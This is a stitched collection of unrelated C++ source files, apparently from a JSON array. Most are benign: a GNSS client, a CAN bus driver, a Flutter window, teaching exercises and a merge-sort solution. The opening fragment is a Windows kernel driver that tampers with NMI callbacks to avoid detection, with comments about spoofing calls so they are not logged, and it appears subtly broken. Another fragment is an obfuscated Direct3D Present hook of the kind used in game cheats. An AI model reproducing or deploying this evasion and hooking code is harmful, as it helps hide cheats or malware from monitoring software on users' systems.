modules::find_pattern(ntos_base_address,\n\t\tNmiSignature,\n\t\tNmiSignatureMask);\n\n\treturn reinterpret_cast<PKNMI_HANDLER_CALLBACK>(nmi_in_progress);\n}\n\nPKNMI_HANDLER_CALLBACK KiNmiCallbackListHead = nullptr;\nextern \"C\" NTSTATUS PreventNMIExecution() {\n\tKiNmiCallbackListHead = SigscanKiNmiCallbackListHead();\n\tPKNMI_HANDLER_CALLBACK CurrentNMI = KiNmiCallbackListHead;\n\twhile (CurrentNMI) {\n\t\tuint8_t* nmi_in_progress = reinterpret_cast<uint8_t*>(KiNmiCallbackListHead);\n\n\t\twhile (*nmi_in_progress != 0x48) {\n\t\t\t++nmi_in_progress;\n\t\t}\n\n\t\tnmi_in_progress = reinterpret_cast<uint8_t*>(reinterpret_cast<intptr_t>(nmi_in_progress) + 3);\n\n\t\tauto irql = KfRaiseIrql(0); // Use Udman Spoof to not get logged by this\n\n\t\tULONG cores = KeQueryActiveProcessorCount(NULL); // Use Udman Spoof to not get logged by this\n\n\t\tfor (auto i = 0ul; i < cores; ++i) {\n\t\t\tKeInterlockedSetProcessorAffinityEx((PKAFFINITY_EX)nmi_in_progress, i); // Use Udman Spoof to not get logged by this\n\t\t\tInterlockedBitTestAndSet64(reinterpret_cast<LONG64*>(nmi_in_progress), i);\n\t\t}\n\n\t\tKeLowerIrql(irql); // Use Udman Spoof to not get logged by this\n\n\t\tCurrentNMI = CurrentNMI->Next;\n\t}\n\treturn STATUS_SUCCESS;\n}\n\nextern \"C\" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)\n{\n\tUNREFERENCED_PARAMETER(DriverObject);\n\tUNREFERENCED_PARAMETER(RegistryPath);\n\n\tNTSTATUS NmiStatus = PreventNMIExecution();\n\treturn NmiStatus;\n}",
    "#include <twist/sim.hpp>\n\n#include <twist/ed/std/atomic.hpp>\n#include <twist/ed/std/thread.hpp>\n\n#include <wheels/core/compiler.hpp>\n\n#include <fmt/core.h>\n\n#include <catch2/catch_test_macros.hpp>\n\n#include <vector>\n\nstatic_assert(twist::build::IsolatedSim());\n\nTEST_CASE(\"FairScheduler\") {\n  SECTION(\"TicketLock\") {\n    // TicketLock\n\n    class TicketLock {\n      using Ticket = uint64_t;\n     public:\n      void Lock() {\n        Ticket my = next_++;\n        while (my != owner_) {\n          // Repeat\n        }\n      }\n\n      void Unlock() {\n        owner_ = owner_ + 1;\n      }\n\n     private:\n      twist::ed::std::atomic<Ticket> next_{0};\n      twist::ed::std::atomic<Ticket> owner_{0};\n    };\n\n    twist::sim::sched::FairScheduler scheduler{{.time_slice = 5}};\n    twist::sim::Simulator sim{&scheduler};\n\n    auto result = sim.Run([] {\n      TicketLock ticket_lock;\n\n      std::vector<twist::ed::std::thread> contenders;\n\n      for (size_t i = 0; i < 4; ++i) {\n        contenders.emplace_back([&ticket_lock] {\n          for (size_t j = 0; j < 128; ++j) {\n            ticket_lock.Lock();\n            ticket_lock.Unlock();\n          }\n        });\n      }\n\n      for (auto& t : contenders) {\n        t.join();\n      }\n    });\n\n    REQUIRE(result.Ok());\n\n    fmt::println(\"Fair: iterations = {}\", result.iters);\n  }\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"curso.h\"\n#include <iostream>\nusing namespace std;\n\nCurso curso[50];\n\n//Cursos base que tendra el programa\nvoid inicializarCurso(){\n    //Matematica\n    curso[0].idC = 1;\n    curso[0].nombre_curso = \"Matematica\";\n    curso[0].creditos = 3;\n    curso[0].ciclo = 1;\n\n    //Comunicacion y Redaccion\n    curso[1].idC = 2;\n    curso[1].nombre_curso = \"Comunicacion y Redaccion\";\n    curso[1].creditos = 3;\n    curso[1].ciclo = 1;\n\n    //Metodologia del Trabajo Universitario\n    curso[2].idC = 3;\n    curso[2].nombre_curso = \"Metodologia del Trabajo Universitario\";\n    curso[2].creditos = 2;\n    curso[2].ciclo = 1;\n\n    //Fundamentos de Programacion\n    curso[3].idC = 4;\n    curso[3].nombre_curso = \"Fundamentos de Programacion\";\n    curso[3].creditos = 3;\n    curso[3].ciclo = 1;\n\n    //Quimica\n    curso[4].idC = 5;\n    curso[4].nombre_curso = \"Quimica\";\n    curso[4].creditos = 3;\n    curso[4].ciclo = 1;\n\n    //Matematica Discreta I\n    curso[5].idC = 6;\n    curso[5].nombre_curso = \"Matematica Discreta I\";\n    curso[5].creditos = 4;\n    curso[5].ciclo = 1;\n\n    //Programacion Grafica\n    curso[6].idC = 7;\n    curso[6].nombre_curso = \"Programacion Grafica\";\n    curso[6].creditos = 4;\n    curso[6].ciclo = 1;\n}\n\nvoid registrarCurso(){\n\n}\nvoid modificarCurso(){\n\n}\nvoid eliminarCurso(){\n\n}\nvoid verCurso(){\n    for (int i = 0; i < 7; i++)\n    {\n        cout<<\"CURSOS: \"<<endl;\n        cout<<\"\\t\\tNombre del curso: \"<<curso[i].nombre_curso<<endl;\n        cout<<\"\\t\\tCreditos: \"<<curso[i].creditos<<endl;\n    }\n}",
    "/* Copyright (c) 2017-2021, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_GnssAPIClient\"\n\n#include <log_util.h>\n#include <loc_cfg.h>\n\n#include \"GnssAPIClient.h\"\n#include <LocContext.h>\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace aidl {\nnamespace implementation {\n\nGnssAPIClient::GnssAPIClient(const shared_ptr<IGnssCallback>& gpsCb) :\n    LocationAPIClientBase(),\n    mTracking(false),\n    mControlClient(new LocationAPIControlClient()),\n    mLocationCapabilitiesMask(0),\n    mLocationCapabilitiesCached(false),\n    mGnssCbIface(gpsCb) {\n    LOC_LOGD(\"%s]: (%p)\", __FUNCTION__, &gpsCb);\n    initLocationOptions();\n}\n\nGnssAPIClient::~GnssAPIClient() {\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n    if (mControlClient) {\n        delete mControlClient;\n        mControlClient = nullptr;\n    }\n}\n\nvoid GnssAPIClient::setCallbacks() {\n    LocationCallbacks locationCallbacks;\n    memset(&locationCallbacks, 0, sizeof(LocationCallbacks));\n    locationCallbacks.size = sizeof(LocationCallbacks);\n    if (mGnssCbIface != nullptr) {\n        locationCallbacks.capabilitiesCb = [this](LocationCapabilitiesMask capabilitiesMask) {\n            onCapabilitiesCb(capabilitiesMask);\n        };\n    }\n    locAPISetCallbacks(locationCallbacks);\n}\n\n// for GpsInterface\nvoid GnssAPIClient::gnssUpdateCallbacks(const shared_ptr<IGnssCallback>& gpsCb) {\n    mMutex.lock();\n    mGnssCbIface = gpsCb;\n    mMutex.unlock();\n\n    if (gpsCb != nullptr) {\n        setCallbacks();\n    }\n}\n\nvoid GnssAPIClient::initLocationOptions() {\n    // set default LocationOptions.\n    memset(&mTrackingOptions, 0, sizeof(TrackingOptions));\n    mTrackingOptions.size = sizeof(TrackingOptions);\n    mTrackingOptions.minInterval = 1000;\n    mTrackingOptions.minDistance = 0;\n    mTrackingOptions.mode = GNSS_SUPL_MODE_STANDALONE;\n}\n\nbool GnssAPIClient::gnssStart() {\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n    mMutex.lock();\n    mTracking = true;\n    mMutex.unlock();\n    locAPIStartTracking(mTrackingOptions);\n    return true;\n}\n\nbool GnssAPIClient::gnssStop() {\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n    mMutex.lock();\n    mTracking = false;\n    mMutex.unlock();\n    locAPIStopTracking();\n    return true;\n}\n\nvoid GnssAPIClient::requestCapabilities() {\n    // only send capablities if it's already cached, otherwise the first time LocationAPI\n    // is initialized, capabilities will be sent by LocationAPI\n    if (mLocationCapabilitiesCached) {\n        onCapabilitiesCb(mLocationCapabilitiesMask);\n    }\n}\n\nvoid GnssAPIClient::gnssEnable(LocationTechnologyType techType) {\n    LOC_LOGD(\"%s]: (%0d)\", __FUNCTION__, techType);\n    if (mControlClient == nullptr) {\n        return;\n    }\n    mControlClient->locAPIEnable(techType);\n}\n\nvoid GnssAPIClient::gnssDisable() {\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n    if (mControlClient == nullptr) {\n        return;\n    }\n    mControlClient->locAPIDisable();\n}\n\nvoid GnssAPIClient::gnssConfigurationUpdate(const GnssConfig& gnssConfig) {\n    LOC_LOGD(\"%s]: (%02x)\", __FUNCTION__, gnssConfig.flags);\n    if (mControlClient == nullptr) {\n        return;\n    }\n    mControlClient->locAPIGnssUpdateConfig(gnssConfig);\n}\n\n// callbacks\nvoid GnssAPIClient::onCapabilitiesCb(LocationCapabilitiesMask capabilitiesMask) {\n    LOC_LOGD(\"%s]: (0x%\" PRIx64 \")\", __FUNCTION__, capabilitiesMask);\n    mLocationCapabilitiesMask = capabilitiesMask;\n    mLocationCapabilitiesCached = true;\n    mMutex.lock();\n    auto gnss",
    "#include<iostream>\nusing namespace std;\n\nint main(){\n\n    /*\n        OPERADORES:\n            - ASIGNACION: igual(=), mas igual(+=), menos igual(-=), por igual(*=), dividido igual(/=)\n            - ARITMETICOS:suma, resta(-), multiplicacion(*), division(/), modulo(%), incremento sufijo(a++), decremento sufijo(a--), incremento prefijo(++a), decremento prefijo(--a)\n            - COMPARACION:\n            - LOGICOS:\n            - NIVEL BIT    \n    */\n\n\n   // declaro e inicializo una variable\n   int a = 5;\n   int b = 10;\n   int c = 20;\n   int d = 30;\n   int x;\n   int y;\n\n   cout << \"\\nAsignacion mas igual:\\n\";\n   a += b; // a = a + b  \n   cout << \"El valor de a es: \" << a << endl;\n\n   x = ++c; // incrementa el valor de c en 1 y luego se le asigna a x\n   y = d++; // primero almacena el valor despues lo incrementa en 1\n   cout << \"\\nIncremento prefijo:\\n\";\n   cout << \"El valor de c es:\" << c << endl;\n   cout << \"El valor de x es:\" << x << endl;\n\n   cout << \"\\nIncremento sufijo:\\n\";\n   cout << \"El valor de d es:\" << d << endl;\n   cout << \"El valor de y es:\" << y << endl;\n   \n\n\n\n    return 0;\n}",
    "#include \"mcp2515_can.hpp\"\n\n// ********************\n// CANONICALS BEGINS  *\n// ********************\nmcp2515_can::mcp2515_can(uint8_t SPICS) {\n  pSPI = &SPI;      // assigning the address of an already instantiated SPIClass object from <SPI.h> to *pSPI\n  init_CS(SPICS);   // Uses pinMode() to set the SPICS pinout to OUTPUT and then use digitalWrite() to write a HIGH into the pinout\n}\n// ******************\n// CANONICALS ENDS  *\n// ******************\n\n\n// ******************\n//  SETTERS BEGINS  *\n// ******************\nvoid mcp2515_can::setSPI(SpiClass *SPI_param) {\n  pSPI = SPI_param;\n}\n\n\n// ******************\n//  SETTERS BEGINS  *\n// ******************\nvoid  mcp2515_can::init_CS(uint8_t CS) {\n  SPICS = CS;\n\n  pinMode(SPICS, OUTPUT);       // set the user-provided pin to OUTPUT mode\n  digitalWrite(SPICS, HIGH);    // write a value of HIGH AKA 1 AKA 5V into the pin to begin with\n  // if the SPICS pin is not already configured as an output\n  // then set it high (to enable the internal pull-up resistor)\n}\n// ******************\n//  SETTERS ENDS    *\n// ******************\n\n\n/*********************************************************************************************************\n** Function name:           begin\n** Descriptions:            init can and set speed\n*********************************************************************************************************/\nuint8_t mcp2515_can::begin(uint32_t speedset,\n                            const uint8_t mosi_pin,\n                            const uint8_t miso_pin,\n                            const uint8_t sck_pin,\n                            const byte clockset) {\n  pSPI->begin(SPICS, mosi_pin, miso_pin, sck_pin) ; // everything here is just calling Arduino system\n\n  byte res = mcp2515_init((byte)speedset, clockset) ; // continue from here\n\n  return ((res == 0) ? 0 : 1) ; // 0 is MCP2515_OK, 0 is CAN_OK, 1 is CAN_FAILINIT\n}\n\n\n\n\n\n/*********************************************************************************************************\n** Function name:           mcp2515_configRate\n** Descriptions:            set baudrate\n*********************************************************************************************************/\nbyte mcp2515_can::mcp2515_configRate(const byte canSpeed, const byte clock) {\n  byte set, cfg1, cfg2, cfg3;\n  set = 1;\n  switch (clock) {\n      case (MCP_16MHz) :\n          switch (canSpeed) {\n                case (CAN_5KBPS):\n                    cfg1 = MCP_16MHz_5kBPS_CFG1;\n                    cfg2 = MCP_16MHz_5kBPS_CFG2;\n                    cfg3 = MCP_16MHz_5kBPS_CFG3;\n                    break;\n\n                case (CAN_10KBPS):\n                    cfg1 = MCP_16MHz_10kBPS_CFG1;\n                    cfg2 = MCP_16MHz_10kBPS_CFG2;\n                    cfg3 = MCP_16MHz_10kBPS_CFG3;\n                    break;\n\n                case (CAN_20KBPS):\n                    cfg1 = MCP_16MHz_20kBPS_CFG1;\n                    cfg2 = MCP_16MHz_20kBPS_CFG2;\n                    cfg3 = MCP_16MHz_20kBPS_CFG3;\n                    break;\n\n                case (CAN_25KBPS):\n                    cfg1 = MCP_16MHz_25kBPS_CFG1;\n                    cfg2 = MCP_16MHz_25kBPS_CFG2;\n                    cfg3 = MCP_16MHz_25kBPS_CFG3;\n                    break;\n\n                case (CAN_31K25BPS):\n                    cfg1 = MCP_16MHz_31k25BPS_CFG1;\n                    cfg2 = MCP_16MHz_31k25BPS_CFG2;\n                    cfg3 = MCP_16MHz_31k25BPS_CFG3;\n                    break;\n\n                case (CAN_33KBPS):\n                    cfg1 = MCP_16MHz_33kBPS_CFG1;\n                    cfg2 = MCP_16MHz_33kBPS_CFG2;\n                    cfg3 = MCP_16MHz_33kBPS_CFG3;\n                    break;\n\n                case (CAN_40KBPS):\n                    cfg1 = MCP_16MHz_40kBPS_CFG1;\n                    cfg2 = MCP_16MHz_40kBPS_CFG2;\n                    cfg3 = MCP_16MHz_40kBPS_CFG3;\n                    break;\n\n                case (CAN_50KBPS):\n                    cfg1 = MCP_16MHz_50kBPS_CFG1;\n                    cfg2 = MCP_16MHz_50kBPS_CFG2;\n                    cfg3 = MCP_16MHz_50kBPS_CFG3;\n                    break;\n\n                case (CAN_80KBPS):\n                    cfg1 = MCP_16MHz_80kBPS_CFG1;\n                    cfg2 = MCP_16MHz_80kBPS_CFG2;\n                    cfg3 = MCP_16MHz_80kBPS_CFG3;\n                    break;\n\n                case (CAN_83K3BPS):\n                    cfg1 = MCP_16MHz_83k3BPS_CFG1;\n                    cfg2 = MCP_16MHz_83k3BPS_CFG2;\n                    cfg3 = MCP_16MHz_83k3BPS_CFG3;\n                    break;\n\n                case (CAN_95KBPS):\n                    cfg1 = MCP_16MHz_95kBPS_CFG1;\n                    cfg2 = MCP_16MHz_95kBPS_CFG2;\n                    cfg3 = MCP_16MHz_95kBPS_CFG3;\n                    break;\n\n                case (CAN_100KBPS):\n                    cfg1 = MCP_16MHz_100kBPS_CFG1;\n                    cfg2 = MCP_16MHz_100kBPS_CFG2;\n                    cfg3 = MCP_16MHz_100kBPS_CFG3;\n                    break;\n\n                case (CAN_125KBPS)",
    "#include \"Metadata.hpp\"\n\nMetadata::Metadata() {\n    id = \"\";\n    mean_pixel = Pixel(1000,1000,1000);\n    std_pixel = Pixel(1000,1000,1000);\n}\n\nMetadata::Metadata(std::string i, double mr, double mg, double mb, double sr, double sg, double sb) {\n    id = i;\n    mean_pixel = Pixel(mr, mg, mb);\n    std_pixel = Pixel(sr, sg, sb);\n}\n\nMetadata::Metadata(const Metadata& other) {\n    id = other.get_id();\n    mean_pixel = other.get_mean_pixel();\n    std_pixel = other.get_std_pixel();\n}\n\nMetadata& Metadata::operator=(const Metadata& other) {\n    if (this == &other) {\n        return *this;\n    }\n    id = other.get_id();\n    mean_pixel = other.get_mean_pixel();\n    std_pixel = other.get_std_pixel();\n    return *this;\n}\n\nvoid Metadata::set_mean_pixel(Pixel p){\n    mean_pixel = p;\n}\n\nvoid Metadata::set_std_pixel(Pixel p) {\n    std_pixel = p;\n}\n\nvoid Metadata::set_id(std::string i) {\n    id = i;\n}\n\nPixel Metadata::get_mean_pixel() const {\n    return mean_pixel;\n}\n\nPixel Metadata::get_std_pixel() const {\n    return std_pixel;\n}\n\nstd::string Metadata::get_id() const {\n    return id;\n}\n\nstd::ostream& operator<<(std::ostream& os, const Metadata& metadata) {\n    os << \"Metadata(id: \" << metadata.get_id() << \", Mean \" << metadata.get_mean_pixel() << \", STD \" << metadata.get_std_pixel() << \")\";\n    return os;\n}\n\n\n",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    " // approch to the problem\n // I used merge sort, here are the detailed steps:\n // step1: find middle node using the fast and slow pointers\n // step2: break the original list into two half: left and right\n // step3: recursively sort both left and right \n // step4: merge the list after sorting\n // step5: return merged list\n \nclass Solution {\n    private:\n    ListNode* findMiddle(ListNode* head){\n        ListNode* slow=head;\n        ListNode* fast=head->next;\n\n        while(fast != NULL && fast->next != NULL){\n            slow=slow->next;\n            fast=fast->next->next;\n        }\n        return slow;\n    }\n\n    ListNode* merge(ListNode* left,ListNode* right){\n        if(left==NULL){\n            return right;\n        }\n        if(right==NULL){\n            return left;\n        }\n        ListNode* ans = new ListNode(-1);\n        ListNode* temp=ans;\n\n        while(left!=NULL && right!=NULL)\n        {\n            if(left->val < right->val)\n            {\n                temp->next=left;\n                temp=left;\n                left=left->next;\n            }\n            else\n            {\n                temp->next=right;\n                temp=right;\n                right=right->next;\n            }\n        }\n\n        while(left!=NULL)\n        {\n                temp->next=left;\n                temp=left;\n                left=left->next; \n        }\n\n        while(right!=NULL)\n        {\n                temp->next=right;\n                temp=right;\n                right=right->next;\n        }\n\n        ans=ans->next;\n        return ans;\n    }\npublic:\n    ListNode* sortList(ListNode* head) {\n        if(head==NULL || head->next == NULL){\n            return head;\n        }\n        //step1:\n        ListNode* mid=findMiddle(head);\n        //step2:\n        ListNode* left=head;\n        ListNode* right=mid->next;\n        mid->next=NULL;\n        //step3:\n        left=sortList(left);\n        right=sortList(right);\n        //step4:\n        ListNode* answer = merge(left,right);\n        //step5:\n        return answer;\n    }\n};\n",
